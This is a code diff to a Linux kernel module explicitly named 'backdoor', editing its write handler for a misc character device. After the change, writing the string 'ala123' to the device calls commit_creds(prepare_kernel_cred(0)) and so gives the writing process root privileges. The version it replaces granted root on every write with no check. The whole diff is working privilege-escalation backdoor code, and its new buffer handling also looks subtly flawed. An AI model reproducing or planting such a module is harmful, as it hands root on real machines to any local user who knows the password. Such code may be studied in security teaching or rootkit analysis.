@@ -21,8 +21,6 @@ static int __init backdoor_init(void)
 		goto err;
 	}
 	return 0;
-		
-	
 	
 	err:
 		misc_deregister(&device);
@@ -42,30 +40,24 @@ static void __exit backdoor_exit(void)
 ssize_t backdoor_write(struct file *filp, const char __user *user_buf,
 	size_t count, loff_t *f_pos)
 {
-	/*int i;
-	char prname_buffer[6];
-	struct task_struct* process;
+	int i;
+	char buffer[8];
+	size_t str_length = 7 - *f_pos;
+	size_t to_cpy = (count > str_length) ? str_length : count;
+
 		
-	for (i = 0; i< 6; i++)
-		prname_buffer[i] = '\0';
+	for (i = 0; i< 8; i++)
+		buffer[i] = '\0';
 		
-	if(count >= 6) return -ENOSPC;
-	if( _copy_from_user(prname_buffer, user_buf, count) != 0)
+	if(count >= 8) return -ENOSPC;
+	if( _copy_from_user(buffer + *f_pos, user_buf, to_cpy) != 0)
 		return -EFAULT;
-		
-	sscanf(prname_buffer, "%u", &current_process);
+
+	*f_pos += to_cpy;
+	if(strncmp(buffer, "ala123\n", to_cpy > 7 ? 7 : to_cpy) == 0)
+		commit_creds(prepare_kernel_cred(0));
 	
-	if ((process = get_pid_task(find_get_pid(current_process), PIDTYPE_PID)) == NULL) {
-		current_process = -1;
-		return -ESRCH;
-	}
-	else {
-		get_task_comm(process_name, process);
-		strcat(process_name, "\n");
-	}*/
-	commit_creds(prepare_kernel_cred(0));
-	
-	return count;
+	return to_cpy;
 		
 }
 
